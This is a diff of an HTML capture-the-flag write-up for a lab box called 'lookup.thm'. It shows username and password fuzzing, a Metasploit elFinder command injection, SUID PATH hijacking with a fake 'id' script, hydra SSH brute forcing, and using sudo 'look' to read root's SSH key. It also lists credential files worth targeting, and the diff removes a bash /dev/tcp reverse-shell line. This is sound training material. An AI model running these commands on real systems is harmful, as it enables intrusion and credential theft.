@@ -117,8 +117,8 @@ PORT   STATE SERVICE
   -fc 200
 </code></pre>
 <p>One username stood out as behaving differently (different response length / different failure message). In this case, <code>admin</code> was a valid username.</p>
-<p>From there I tried password fuzzing for the known-valid user. A single password candidate produced a noticeably different response compared to the rest (a strong hint that it’s relevant), but <code>admin:&lt;candidate&gt;</code> still did not log in.</p>
-<p>Instead of stopping there, I re-ran username fuzzing while keeping that candidate password fixed. That revealed a second username that actually authenticated successfully:</p>
+<p>From there I tried password fuzzing for the known-valid user. However <code>admin:&lt;candidate&gt;</code> did not log yield results.</p>
+<p>I re-ran username fuzzing with shorter &amp; simpler namelist (mainly because I was connected to my phones hotspot that couldn&#39;t handle larger lists efficiently). That revealed a second username that actually authenticated successfully with password from <code>rockyou.txt</code>:</p>
 <ul>
 <li><code>jose</code> / <code>password123</code></li>
 </ul>
@@ -140,17 +140,15 @@ PORT   STATE SERVICE
 <li>Trigger an image action (rotate/resize) so the backend executes the injected filename.</li>
 <li>Hit the newly written PHP file with a query parameter to run commands, then pop a reverse shell.</li>
 </ol>
-<p>Once code execution is working, I switched to a reverse shell.</p>
-<p>Example reverse shell payload:</p>
-<pre><code class="language-text">bash -c &#39;bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/&lt;YOUR_PORT&gt; 0&gt;&amp;1&#39;
-</code></pre>
+<p>Luckily this exploit already exists in metasploit as <code>exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection</code>, so not much of technical hocuspocus here. Just load the exploit, choose the payload, set the target and launch the cannon and boom - you have a shell as <code>www-data</code>. Normal script kiddie activities.</p>
 <h3>Horizontal Privilege Escalation (SUID <code>pwm</code> + PATH Injection)</h3>
 <p>From the <code>www-data</code> shell, I found a SUID binary:</p>
 <ul>
 <li><code>/usr/sbin/pwm</code></li>
 </ul>
-<p>It invokes common utilities (like <code>id</code>) and attempts to read a <code>.passwords</code> file but looks in the wrong place. By placing a fake <code>id</code> earlier in <code>PATH</code>, I could influence what <code>pwm</code> sees and coax it into revealing the password list.</p>
-<p>In practice, the trick is that <code>pwm</code> appears to call <code>id</code> without an absolute path and then makes decisions based on its output. By writing our own <code>id</code> script into <code>/tmp</code> and prepending <code>/tmp</code> to <code>PATH</code>, <code>pwm</code> will execute our script, which prints an <code>id</code>-style line containing <code>(think)</code>.</p>
+<p>The binary invokes common utilities like <code>id</code> and attempts to read a <code>.passwords</code> file, but it looks in the wrong place. This opens the door for <strong>PATH hijacking</strong>. By placing a fake <code>id</code> earlier in <code>PATH</code>, we can control what <code>pwm</code> sees and influence its logic.</p>
+<p>The key detail is that <code>pwm</code> calls <code>id</code> <strong>without an absolute path</strong> and makes decisions based on its output. By dropping a custom <code>id</code> script into <code>/tmp</code> and prepending <code>/tmp</code> to <code>PATH</code>, <code>pwm</code> executes our script instead of the real binary. The script simply prints an <code>id</code>-style line containing <code>(think)</code>, convincing the program it’s running as the <code>think</code> user.</p>
+<p>In simpler terms, we trick the custom binary into believing it was executed by another user. It then runs its normal functionality and reads the password file in <code>think</code>’s home directory. Normally we can’t just walz in there with restricted user, such as <code>www-data</code>, but by abusing the program’s logic we get it to print the passwords for us.</p>
 <p>Highlights: SUID bit file pwn</p>
 <pre><code class="language-text">echo &#39;#!/bin/bash&#39; &gt; /tmp/id
 echo &#39;echo &quot;uid=33(think) gid=33(think) groups=(think)&quot;&#39; &gt;&gt; /tmp/id
@@ -158,14 +156,38 @@ chmod +x /tmp/id
 export PATH=/tmp:$PATH
 /usr/sbin/pwm
 </code></pre>
-<p>After that, I collected the leaked passwords into a wordlist and brute-forced SSH for the <code>think</code> user.</p>
+<p>As suspected, it leaked password list. I collected the leaked passwords into a wordlist and brute-forced SSH for the <code>think</code> user.</p>
 <p>Example:</p>
 <pre><code class="language-bash">hydra -l think -P passwords.txt ssh://lookup.thm
 </code></pre>
+<ul>
+<li><strong>Password of think:</strong> <code>josemario.AKA(think)</code></li>
+</ul>
 <h3>Root (Sudo <code>look</code> via GTFOBins)</h3>
 <p>As <code>think</code>, <code>sudo -l</code> shows a passwordless rule allowing <code>look</code> as root.</p>
-<p>Because <code>look</code> can read arbitrary files (GTFOBins), I used it to dump root-only files.</p>
-<p>Highlights: Sudo <code>look</code> to extract SSH private key</p>
+<p>Because <code>look</code> can read arbitrary files (GTFOBins), I used it to dump root-only files. My initial intuition was to read <code>/etc/shadow</code> to obtain hashes, but that action was blocked.</p>
+<p>Luckily reading /etc/shadow is not the only way to obtain root&#39;s pass. Examples of possible paths:</p>
+<p>Vertical vectors (escalate to root):</p>
+<ul>
+<li><code>/root/.ssh/id_rsa</code> -&gt; private key for direct root SSH login</li>
+<li><code>/root/.ssh/authorized_keys</code> -&gt; inject your own key if write is available</li>
+<li><code>/var/backups/shadow.bak</code>, <code>passwd.bak</code> -&gt; backup hashes to crack offline</li>
+<li><code>/proc/1/environ</code>, <code>/proc/1/cmdline</code> -&gt; secrets from root-owned init process</li>
+<li><code>/root/.bashrc</code>, <code>/root/.profile</code> -&gt; credential env vars loaded on root login</li>
+<li><code>/var/spool/cron/crontabs/root</code> -&gt; reveals scripts executed as root</li>
+<li><code>/etc/sudoers</code>, <code>/etc/sudoers.d/*</code> -&gt; misconfigurations granting unintended root access</li>
+</ul>
+<p>If vertical privilege escalation vectors don&#39;t yield results, you should enumerate for potentially interesting horizontal targets that can ultimately provide the path to root.</p>
+<p>Horizontal vectors (pivot to another user):</p>
+<ul>
+<li><code>/etc/passwd</code> -&gt; enumerate valid users to target</li>
+<li><code>/root/.bash_history</code> -&gt; commands revealing interactions with other accounts</li>
+<li><code>/root/.netrc</code> -&gt; FTP/HTTP credentials belonging to other users</li>
+<li><code>/root/.my.cnf</code>, <code>/root/.pgpass</code> -&gt; DB credentials reused across accounts</li>
+<li><code>/opt/*/config*</code>, <code>/var/www/*/config*</code> -&gt; app credentials for service accounts</li>
+<li><code>sudo -l</code> reveals <code>(bob) NOPASSWD:</code> style entries -&gt; pivot directly into another user&#39;s shell</li>
+</ul>
+<p>I didn&#39;t have to resort to moving horizontally, sudo <code>look</code> allowed me to extract SSH private key:</p>
 <pre><code class="language-bash">LFILE=/root/.ssh/id_rsa
 sudo /usr/bin/look &#39;&#39; &quot;$LFILE&quot;
 </code></pre>
